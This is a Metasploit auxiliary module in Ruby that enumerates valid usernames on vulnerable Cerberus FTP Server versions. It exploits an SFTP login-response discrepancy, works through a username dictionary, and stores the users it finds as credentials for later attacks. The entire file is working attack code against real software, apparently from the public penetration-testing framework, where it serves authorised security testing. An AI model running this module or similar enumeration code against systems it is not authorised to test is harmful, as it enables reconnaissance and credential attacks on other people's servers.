##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'net/ssh'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Cerberus FTP Server SFTP Username Enumeration',
      'Description' => %q{
        This module uses a dictionary to brute force valid usernames from
        Cerberus FTP server via SFTP.  This issue affects all versions of
        the software older than 6.0.9.0 or 7.0.0.2 and is caused by a discrepancy
        in the way the SSH service handles failed logins for valid and invalid
        users.  This issue was discovered by Steve Embling.
      },
      'Author'      => [
        'Steve Embling', # Discovery
        'Matt Byrne <attackdebris[at]gmail.com>' # Metasploit module
      ],
      'References'     =>
        [
          [ 'URL',  'http://xforce.iss.net/xforce/xfdb/93546' ],
          [ 'BID', '67707']
        ],
      'License'     => MSF_LICENSE,
      'DisclosureDate' => 'May 27 2014'
    ))

    register_options(
      [
        Opt::Proxies,
        Opt::RPORT(22),
        OptPath.new(
          'USER_FILE',
          [true, 'Files containing usernames, one per line', nil])
      ], self.class
    )

    register_advanced_options(
      [
        OptInt.new(
          'RETRY_NUM',
          [true , 'The number of attempts to connect to a SSH server for each user', 3]),
        OptInt.new(
          'SSH_TIMEOUT',
          [true, 'Specify the maximum time to negotiate a SSH session', 10]),
        OptBool.new(
          'SSH_DEBUG',
          [true, 'Enable SSH debugging output (Extreme verbosity!)', false])
      ]
    )
  end

  def rport
    datastore['RPORT']
  end

  def retry_num
    datastore['RETRY_NUM']
  end

  def check_vulnerable(ip)
    opt_hash = {
      :port            => rport,
      :auth_methods    => ['password', 'keyboard-interactive'],
      :use_agent       => false,
      :config          => false,
      :password_prompt => Net::SSH::Prompt.new,
      :non_interactive => true,
      :proxies         => datastore['Proxies'],
      :verify_host_key => :never
    }

    begin
      transport = Net::SSH::Transport::Session.new(ip, opt_hash)
    rescue Rex::ConnectionError
      return :connection_error
    end

    auth = Net::SSH::Authentication::Session.new(transport, opt_hash)
    auth.authenticate("ssh-connection", Rex::Text.rand_text_alphanumeric(8), Rex::Text.rand_text_alphanumeric(8))
    auth_method = auth.allowed_auth_methods.join('|')
    print_good "#{peer(ip)} Server Version: #{auth.transport.server_version.version}"
    report_service(
      host:  ip,
      port:  rport,
      name:  "ssh",
      proto: "tcp",
      info:  auth.transport.server_version.version
    )

    if auth_method.empty?
      :vulnerable
    else
      :safe
    end
  end

  def check_user(ip, user, port)
    pass = Rex::Text.rand_text_alphanumeric(8)

    opt_hash = {
      :auth_methods    => ['password', 'keyboard-interactive'],
      :port            => port,
      :use_agent       => false,
      :config          => false,
      :proxies         => datastore['Proxies'],
      :verify_host_key => :never
    }

    opt_hash.merge!(verbose: :debug) if datastore['SSH_DEBUG']
    transport = Net::SSH::Transport::Session.new(ip, opt_hash)
    auth = Net::SSH::Authentication::Session.new(transport, opt_hash)

    begin
      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
        auth.authenticate("ssh-connection", user, pass)
        auth_method = auth.allowed_auth_methods.join('|')
        if auth_method != ''
          :success
        else
          :fail
        end
      end
    rescue Rex::ConnectionError
      return :connection_error
    rescue Net::SSH::Disconnect, ::EOFError
      return :success
    rescue ::Timeout::Error
      return :connection_error
    end
  end

  def do_report(ip, user, port)
    service_data = {
      address: ip,
      port: rport,
      service_name: 'ssh',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: user,
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def peer(rhost=nil)
    "#{rhost}:#{rport} SSH -"
  end

  def user_list
    users = nil
    if File.readable? datastore['USER_FILE']
      users = File.new(datastore['USER_FILE']).read.split
      users.each {|u| u.downcase!}
      users.uniq!
    else
      raise ArgumentError, "Cannot read file #{datastore['USER_FILE']}"
    end

    users
  end

  def attempt_user(user, ip)
    attempt_num = 0
    ret = nil

    while (attempt_num <= retry_num) && (ret.nil? || ret == :connection_error)
      if attempt_num > 0
        Rex.sleep(2 ** attempt_num)
        vprint_status("#{peer(ip)} Retrying '#{user}' due to connection error")
      end

      ret = check_user(ip, user, rport)
      attempt_num += 1
    end

    ret
  end

  def show_result(attempt_result, user, ip)
    case attempt_result
    when :success
      print_good "#{peer(ip)} User '#{user}' found"
      do_report(ip, user, rport)
    when :connection_error
      print_error "#{peer(ip)} User '#{user}' could not connect"
    when :fail
      vprint_status "#{peer(ip)} User '#{user}' not found"
    end
  end

  def run_host(ip)
    print_status "#{peer(ip)} Checking for vulnerability"
    case check_vulnerable(ip)
    when :vulnerable
      print_good "#{peer(ip)} Vulnerable"
      print_status "#{peer(ip)} Starting scan"
      user_list.each do |user|
        show_result(attempt_user(user, ip), user, ip)
      end
    when :safe
      print_error "#{peer(ip)} Not vulnerable"
    when :connection_error
      print_error "#{peer(ip)} Connection failed"
    end
  end
end

